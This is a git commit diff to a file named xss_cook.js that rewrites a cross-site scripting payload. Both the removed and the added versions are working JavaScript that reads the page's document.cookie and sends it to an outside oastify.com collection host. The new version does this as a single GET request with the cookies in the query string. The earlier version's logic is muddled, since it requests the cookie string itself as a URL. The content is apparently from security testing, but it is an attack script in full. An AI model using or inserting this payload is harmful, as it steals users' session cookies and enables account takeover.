d2f1e23b606b75e43ad8fe4c4504aed9191a5a74
Richard Haaga <richard.haaga@gmail.com>
2023-06-26 14:16:19 +0200

    Update xss_cook.js

--- xss_cook.js
+++ xss_cook.js
@@ -1,20 +1,3 @@
- var xhr = new XMLHttpRequest();
- xhr.open('GET', document.cookie, true);
- xhr.responseType = 'text';
-
- xhr.onload = function () {
-     if (xhr.readyState === xhr.DONE) {
-         if (xhr.status === 200) {
-             sendData(xhr.responseText);
-         }
-     }
- };
- xhr.send(null);
-
-function sendData(data){
-    var url = 'https://ppix9ytbop5ra9e6ra2ji79lcci36tui.oastify.com'
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST',url,true);
-    xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
-    xhr.send('data=' + data);
-} 
+var xhr=new XMLHttpRequest(); 
+xhr.open("GET", "https://ppix9ytbop5ra9e6ra2ji79lcci36tui.oastify.com/?"+document.cookie, true); 
+xhr.send();
